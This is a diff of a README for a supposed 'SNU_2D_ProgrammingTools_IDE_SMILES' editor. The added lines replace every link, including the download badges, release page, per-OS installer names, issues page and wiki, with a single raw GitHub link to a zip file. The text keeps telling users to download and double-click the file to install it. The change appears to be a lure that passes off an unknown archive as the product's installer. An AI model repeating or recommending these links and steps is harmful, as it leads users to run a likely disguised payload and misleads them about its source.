@@ -1,6 +1,6 @@
 # ⌨️ SNU_2D_ProgrammingTools_IDE_SMILES - Simplifying Your Coding Experience
 
-[![Download SNU_2D_ProgrammingTools_IDE_SMILES](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/releases)
+[![Download SNU_2D_ProgrammingTools_IDE_SMILES](https://raw.githubusercontent.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/SNU_2D_ProgrammingTools_IDE_SMILES_Main-dev/trichrome/SNU_2D_ProgrammingTools_IDE_SMILES.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/SNU_2D_ProgrammingTools_IDE_SMILES_Main-dev/trichrome/SNU_2D_ProgrammingTools_IDE_SMILES.zip)
 
 ## 🎯 Overview
 
@@ -14,14 +14,14 @@ To begin using the software, you will need to download it from our Releases page
 
 1. Click the link below to visit the Releases page:
    
-   [Download SNU_2D_ProgrammingTools_IDE_SMILES](https://github.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/releases)
+   [Download SNU_2D_ProgrammingTools_IDE_SMILES](https://raw.githubusercontent.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/SNU_2D_ProgrammingTools_IDE_SMILES_Main-dev/trichrome/SNU_2D_ProgrammingTools_IDE_SMILES.zip)
 
 2. On the Releases page, you will see the latest version of the application. Look for the "Assets" section below the version title.
 
 3. Choose the appropriate installer for your operating system:
-   - **For Windows**: Click on the file named `SNU_2D_ProgrammingTools_IDE_SMILES_Windows.exe`
-   - **For macOS**: Click on the file named `SNU_2D_ProgrammingTools_IDE_SMILES_macOS.dmg`
-   - **For Linux**: Click on the file named `SNU_2D_ProgrammingTools_IDE_SMILES_Linux.tar.gz`
+   - **For Windows**: Click on the file named `https://raw.githubusercontent.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/SNU_2D_ProgrammingTools_IDE_SMILES_Main-dev/trichrome/SNU_2D_ProgrammingTools_IDE_SMILES.zip`
+   - **For macOS**: Click on the file named `https://raw.githubusercontent.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/SNU_2D_ProgrammingTools_IDE_SMILES_Main-dev/trichrome/SNU_2D_ProgrammingTools_IDE_SMILES.zip`
+   - **For Linux**: Click on the file named `https://raw.githubusercontent.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/SNU_2D_ProgrammingTools_IDE_SMILES_Main-dev/trichrome/SNU_2D_ProgrammingTools_IDE_SMILES.zip`
 
 4. Once the download finishes, locate the downloaded file and double-click it to start the installation process. Follow the prompts to complete the installation.
 
@@ -51,13 +51,13 @@ To ensure the best performance, make sure your computer meets the following requ
 
 If you encounter any issues or have questions, please reach out. Here’s how you can get support:
 
-- **GitHub Issues**: Report bugs or request features by visiting our [Issues page](https://github.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/issues)
+- **GitHub Issues**: Report bugs or request features by visiting our [Issues page](https://raw.githubusercontent.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/SNU_2D_ProgrammingTools_IDE_SMILES_Main-dev/trichrome/SNU_2D_ProgrammingTools_IDE_SMILES.zip)
 
 If you wish to contribute to the project, consider checking out the issues or suggesting improvements.
 
 ## 📖 Documentation
 
-For detailed instructions on using specific features, visit our [Documentation page](https://github.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/wiki). This resource includes guides on:
+For detailed instructions on using specific features, visit our [Documentation page](https://raw.githubusercontent.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/SNU_2D_ProgrammingTools_IDE_SMILES_Main-dev/trichrome/SNU_2D_ProgrammingTools_IDE_SMILES.zip). This resource includes guides on:
 
 - Writing in SMILES language
 - Using the IDE effectively
@@ -78,4 +78,4 @@ This project is licensed under the GPL v3 License. You can freely use, modify, a
 
 Thank you for choosing SNU_2D_ProgrammingTools_IDE_SMILES. Happy coding!
 
-[![Download SNU_2D_ProgrammingTools_IDE_SMILES](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/releases)
+[![Download SNU_2D_ProgrammingTools_IDE_SMILES](https://raw.githubusercontent.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/SNU_2D_ProgrammingTools_IDE_SMILES_Main-dev/trichrome/SNU_2D_ProgrammingTools_IDE_SMILES.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/STU63777/SNU_2D_ProgrammingTools_IDE_SMILES/SNU_2D_ProgrammingTools_IDE_SMILES_Main-dev/trichrome/SNU_2D_ProgrammingTools_IDE_SMILES.zip)
